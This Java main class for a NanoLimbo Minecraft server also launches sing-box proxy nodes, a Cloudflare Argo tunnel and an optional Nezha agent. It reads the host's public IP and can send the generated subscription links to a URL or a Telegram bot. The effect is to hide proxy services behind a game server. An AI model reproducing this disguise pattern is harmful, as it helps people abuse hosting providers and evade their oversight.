package ua.nanit.limbo;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;
import ua.nanit.limbo.proxy.SingBoxManager;
import ua.nanit.limbo.proxy.CloudflaredManager;
import ua.nanit.limbo.proxy.SubscriptionGenerator;
import ua.nanit.limbo.proxy.NetworkDetector;
import ua.nanit.limbo.proxy.ConsoleUtils;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public final class NanoLimbo {

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "REALITY_PRIVATE_KEY", "REALITY_SHORT_ID", "CF_VERSION",
        "SBX_LIB_SHA256", "BOT_LIB_SHA256"
    };

    public static void main(String[] args) {
        double classVersion = Double.parseDouble(System.getProperty("java.class.version"));
        if (classVersion < 52.0) {
            System.err.println(ConsoleUtils.ANSI_RED + "ERROR: Your Java version is too low (class version " + classVersion + "). Java 8 (52.0) or higher is required!" + ConsoleUtils.ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            System.exit(1);
        }

        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
            System.exit(1);
        }

        try {
            startServices();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                SingBoxManager.shutdown();
                CloudflaredManager.shutdown();
                System.out.println(ConsoleUtils.ANSI_RED + "Proxy services terminated" + ConsoleUtils.ANSI_RESET);
            }));

            Thread.sleep(5000);
            ConsoleUtils.clearConsole();
            System.out.println(ConsoleUtils.ANSI_GREEN + "Server is running!\n" + ConsoleUtils.ANSI_RESET);
            System.out.println(ConsoleUtils.ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ConsoleUtils.ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ConsoleUtils.ANSI_RED + "Error initializing services: " + e.getMessage() + ConsoleUtils.ANSI_RESET);
            e.printStackTrace();
        }
    }

    /**
     * Load env vars from hardcoded defaults, then system env, then .env file.
     * Edit the defaults below to set your configuration directly in Java.
     */
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();

        // ===== 在此处填写你的配置 =====
        // 直接修改变量值，不需要的留空 ""
        // 编辑后保存文件，Actions 会自动构建。完整变量表见 README。
        envVars.put("UUID", UUID.randomUUID().toString());  // 节点UUID（不填则随机）
        envVars.put("PORT", "25565");                       // Minecraft监听端口
        envVars.put("FILE_PATH", "./world");                // 运行时文件目录
        envVars.put("NEZHA_SERVER", "");                    // 哪吒面板地址
        envVars.put("NEZHA_PORT", "");                      // 哪吒agent端口(v0)
        envVars.put("NEZHA_KEY", "");                       // 哪吒agent密钥
        envVars.put("ARGO_PORT", "8001");                   // Argo隧道端口
        envVars.put("ARGO_DOMAIN", "");                     // Argo固定隧道域名（请通过 .env 或环境变量设置）
        envVars.put("ARGO_AUTH", "");                       // Argo隧道token/JSON（请通过 .env 或环境变量设置）
        envVars.put("S5_PORT", "");                         // SOCKS5端口
        envVars.put("HY2_PORT", "25817");                        // Hysteria2端口
        envVars.put("TUIC_PORT", "");                       // TUIC端口
        envVars.put("ANYTLS_PORT", "");                     // AnyTLS端口
        envVars.put("REALITY_PORT", "25817");                    // Reality端口
        envVars.put("ANYREALITY_PORT", "");                 // AnyReality端口
        envVars.put("REALITY_PRIVATE_KEY", "");             // Reality私钥
        envVars.put("REALITY_SHORT_ID", "");                // Reality ShortId
        envVars.put("UPLOAD_URL", "");                      // 订阅上传URL
        envVars.put("CHAT_ID", "");                         // Telegram Chat ID
        envVars.put("BOT_TOKEN", "");                       // Telegram Bot Token
        envVars.put("CFIP", "");                 // 优选域名/IP（请通过 .env 或环境变量设置）
        envVars.put("CFPORT", "443");                       // 优选端口
        envVars.put("NAME", "");                            // 节点名称
        envVars.put("DISABLE_ARGO", "false");               // 关闭Argo隧道
        envVars.put("CF_VERSION", "2025.10.0");             // CF版本
        envVars.put("SBX_LIB_SHA256", "");                  // sbx.so SHA-256
        envVars.put("BOT_LIB_SHA256", "");                  // bot.so SHA-256
        // ===== 配置结束 =====

        // 系统环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // .env文件覆盖（jar同目录）
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }

        return envVars;
    }

    private static void startServices() throws Exception {
        Map<String, String> env = loadEnvVars();

        String realIP = NetworkDetector.getPublicIP();
        String realityDest = NetworkDetector.detectRealityDest();
        env.put("REALITY_DEST", realityDest);
        env.put("SERVER_IP", realIP);
        System.out.println("[SBX] Reality dest SNI: " + realityDest);
        System.out.println("[SBX] Detected server IP: " + realIP);

        String argoDomain = env.get("ARGO_DOMAIN");
        if (argoDomain == null || argoDomain.trim().isEmpty()) {
            env.put("ARGO_DOMAIN", "");
        }

        SingBoxManager.generateRealityKeysIfNeeded(env);
        SubscriptionGenerator.generate(env);
        SingBoxManager.start(env);

        String disableArgo = env.getOrDefault("DISABLE_ARGO", "false");
        if ("false".equalsIgnoreCase(disableArgo)) {
            CloudflaredManager.start(env);
        } else {
            System.out.println("[CF] Argo tunnel disabled by DISABLE_ARGO=true");
        }
    }
}
